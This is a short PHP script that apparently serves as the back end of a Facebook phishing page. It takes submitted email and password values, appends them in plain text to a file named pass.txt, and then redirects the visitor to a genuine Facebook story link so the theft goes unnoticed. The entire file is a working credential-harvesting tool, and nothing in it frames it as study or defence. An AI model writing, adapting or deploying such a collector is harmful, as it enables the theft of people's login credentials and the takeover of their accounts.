<?php
if(isset($_POST['email']) && isset($_POST['pass'])) {
    $data = $_POST['email'] . '-' . $_POST['pass'] . "\n";
    $ret = file_put_contents('pass.txt', $data, FILE_APPEND | LOCK_EX);
    if($ret === false) {
        die('There was an error writing this file');
    }
    else {
        // echo "$ret bytes written to file";
        header( "Location: https://m.facebook.com/story.php?story_fbid=1363278310444373&id=100002866500518&_rdr" );
    }
}
else {
   die('no post data to process');
}
